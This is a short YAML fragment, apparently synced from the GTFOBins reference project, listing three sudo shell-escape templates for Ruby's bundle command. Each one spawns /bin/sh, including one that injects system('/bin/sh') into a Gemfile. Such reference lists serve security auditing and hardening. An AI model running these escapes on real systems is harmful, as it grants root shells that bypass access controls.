- shell
privilege_required: sudo
sources:
- project: GTFOBins
  upstream_url: https://gtfobins.github.io
  license: MIT (verify upstream LICENSE)
  upstream_version: acd5246
  last_synced: '2026-08-25'
commands:
- template: BUNDLE_GEMFILE=x bundle exec /bin/sh
- template: 'touch Gemfile

    bundle exec /bin/sh'
- template: 'echo ''system("/bin/sh")'' >Gemfile

    bundle install'
